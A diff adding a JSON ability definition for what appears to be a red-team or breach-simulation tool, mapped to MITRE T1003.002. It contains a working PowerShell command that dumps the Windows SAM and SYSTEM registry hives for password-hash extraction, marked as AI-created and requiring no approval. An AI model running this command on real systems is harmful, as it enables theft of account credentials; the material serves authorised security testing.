@@ -1,0 +1,37 @@
+{
+  "ability_id": "a880be9d-23e6-451a-ae54-d1970770dafd",
+  "skill": "accessing-credentials",
+  "saved_at": "2026-06-24T07:43:08.490398+00:00",
+  "ability": {
+    "name": "SAM/LSA Registry Extraction",
+    "description": "Attempts local credential extraction via registry hives.",
+    "mitre_tactic": "credential-access",
+    "mitre_technique_id": "T1003.002",
+    "platform": "windows",
+    "impact_type": "read",
+    "default_severity": "high",
+    "requires_approval": false,
+    "tags": [
+      "registry",
+      "sam",
+      "lsa"
+    ],
+    "created_by": "ai",
+    "engagement_id": "2b46bea0854443f1a134f53563af2133"
+  },
+  "stages": [
+    {
+      "stage_name": "Extract SAM/LSA registry hives",
+      "stage_order": 1,
+      "executor": "powershell",
+      "command_template": "$d='C:\\\\Windows\\\\Temp\\\\bas\\\\cred_access'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { reg save HKLM\\\\SAM $d\\\\sam.hiv /y; reg save HKLM\\\\SYSTEM $d\\\\system.hiv /y; \\\"SAM/SYSTEM hives saved successfully\\\" } catch { \\\"ERROR: $_\\\" }) | Tee-Object -FilePath $d\\\\local_hashes.txt",
+      "timeout_seconds": 60,
+      "payload_id": null
+    }
+  ],
+  "rationale": "Saves SAM and SYSTEM hives to local folder to perform local password hash extraction.",
+  "provider": "Lead Red Team Operator",
+  "cited_urls": [
+    "https://attack.mitre.org/techniques/T1003/002/"
+  ]
+}
